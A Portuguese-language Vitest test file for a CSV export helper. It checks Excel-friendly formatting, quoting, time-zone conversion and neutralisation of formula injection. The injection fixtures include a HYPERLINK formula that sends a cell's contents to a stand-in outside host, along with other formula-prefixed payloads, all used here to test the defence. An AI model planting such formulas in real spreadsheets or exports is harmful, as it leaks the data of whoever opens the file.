import { describe, expect, it } from 'vitest';
import { BOM, dataHoraLocal, gerarCsv } from './csv';

type Linha = { nome: string | null; total: number; obs?: string | null };

const COLUNAS = [
  { cabecalho: 'Nome', valor: (l: Linha) => l.nome },
  { cabecalho: 'Total', valor: (l: Linha) => l.total },
  { cabecalho: 'Observação', valor: (l: Linha) => l.obs },
];

describe('gerarCsv', () => {
  it('começa com BOM, senão o Excel come os acentos', () => {
    const csv = gerarCsv([{ nome: 'Ji-Paraná', total: 1 }], COLUNAS);
    expect(csv.startsWith(BOM)).toBe(true);
    expect(csv).toContain('Ji-Paraná');
  });

  it('usa ponto e vírgula, senão o Excel em português joga tudo numa coluna', () => {
    const csv = gerarCsv([{ nome: 'Maria', total: 3 }], COLUNAS);
    expect(csv).toContain('Nome;Total;Observação');
    expect(csv).toContain('Maria;3;');
  });

  it('usa CRLF', () => {
    expect(gerarCsv([{ nome: 'a', total: 1 }], COLUNAS)).toContain('\r\n');
  });

  it('escapa o próprio separador', () => {
    const csv = gerarCsv([{ nome: 'Souza; Maria', total: 1 }], COLUNAS);
    expect(csv).toContain('"Souza; Maria"');
  });

  it('escapa aspas dobrando', () => {
    const csv = gerarCsv([{ nome: 'A "vó" Maria', total: 1 }], COLUNAS);
    expect(csv).toContain('"A ""vó"" Maria"');
  });

  it('escapa quebra de linha dentro do campo', () => {
    const csv = gerarCsv([{ nome: 'linha1\nlinha2', total: 1 }], COLUNAS);
    expect(csv).toContain('"linha1\nlinha2"');
  });

  it('nulo e indefinido viram célula vazia, não "null"', () => {
    const csv = gerarCsv([{ nome: null, total: 0, obs: undefined }], COLUNAS);
    expect(csv).not.toContain('null');
    expect(csv).not.toContain('undefined');
    expect(csv).toContain(';0;');
  });

  it('preserva espaço nas pontas com aspas', () => {
    expect(gerarCsv([{ nome: '  Maria  ', total: 1 }], COLUNAS)).toContain('"  Maria  "');
  });

  it('lista vazia devolve só o cabeçalho', () => {
    const csv = gerarCsv([] as Linha[], COLUNAS);
    expect(csv).toBe(`${BOM}Nome;Total;Observação\r\n`);
  });
});

/**
 * Injeção de fórmula.
 *
 * O nome do contato vem do formulário público e da planilha importada — texto
 * de terceiro. Sem o apóstrofo à frente, o Excel EXECUTA a célula quando o
 * gestor abre o relatório, com a base inteira ao alcance dela.
 */
describe('gerarCsv contra injeção de fórmula', () => {
  const PERIGOSOS = [
    '=HYPERLINK("http://fora/"&A1,"clique")',
    '+1+1',
    '-1+1',
    '@SUM(A1:A9)',
    '\tcmd',
    '\r=1+1',
  ];

  it.each(PERIGOSOS)('neutraliza %j com apóstrofo e aspas', (valor) => {
    const csv = gerarCsv([{ nome: valor, total: 1 }], COLUNAS);
    const celula = csv.split('\r\n')[1].split(';')[0];
    expect(celula.startsWith(`"'`)).toBe(true);
    // O conteúdo continua legível para quem lê o relatório.
    expect(csv).toContain(valor.replace(/"/g, '""'));
  });

  it('não mexe em texto que só PARECE fórmula no meio', () => {
    expect(gerarCsv([{ nome: 'Maria = Souza', total: 1 }], COLUNAS)).toContain('Maria = Souza');
    expect(gerarCsv([{ nome: 'Maria = Souza', total: 1 }], COLUNAS)).not.toContain(`"'`);
  });

  it('deixa telefone e número em paz', () => {
    // formatarExibicao já entrega (69) 98123-4567 — sem + na frente.
    const csv = gerarCsv([{ nome: '(69) 98123-4567', total: 30 }], COLUNAS);
    expect(csv).toContain('(69) 98123-4567');
    expect(csv).not.toContain(`"'`);
  });
});

describe('dataHoraLocal', () => {
  it('converte para o fuso da operação, não o do servidor', () => {
    // 13:00 UTC = 09:00 em Porto Velho (UTC−4)
    expect(dataHoraLocal('2026-08-24T13:00:00Z', 'America/Porto_Velho')).toBe('24/08/2026, 09:00');
  });

  it('vazio quando não há data', () => {
    expect(dataHoraLocal(null, 'America/Porto_Velho')).toBe('');
    expect(dataHoraLocal(undefined, 'America/Porto_Velho')).toBe('');
  });
});
